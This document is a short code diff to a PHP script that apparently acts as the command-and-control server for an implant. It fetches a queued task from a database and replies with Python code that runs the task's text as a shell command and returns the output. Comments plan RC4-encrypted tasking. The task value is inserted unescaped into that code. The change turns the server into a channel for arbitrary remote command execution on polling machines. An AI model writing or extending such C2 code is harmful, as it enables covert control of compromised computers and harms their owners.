@@ -88,7 +88,7 @@
                 $statement->bindValue(":process_id", $process_id);
                 $statement->execute();
                 $row_count = $statement->rowCount();
-                $results = $statement->fetchAll(PDO::FETCH_ASSOC);
+                $results = $statement->fetch(PDO::FETCH_ASSOC);
 
                 # Kills database connection
                 $statement->connection = null;
@@ -96,9 +96,14 @@
                 # If we have something tasked
                 # TO DO: Output RC4 encrypted task here
                 if ($row_count == 1) {
-                    # DEBUGGING
-                    #echo rc4($encryption_key, "print 'hunter is kewl'");
-                    echo "print 'hunter is kewl'";
+                    $task_action = $results["task_action"];
+                    $task_secondary = $results["task_secondary"];
+
+                    # TO DO: Add in check if task action is "command"
+
+                    # TO DO: Add in RC4 encrypted update to "update.php"
+                    # TO DO: Add in retrieval of command from "tasks" table
+                    echo "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); out, err = process.communicate(); print err; print out";
                 }
             }
         }
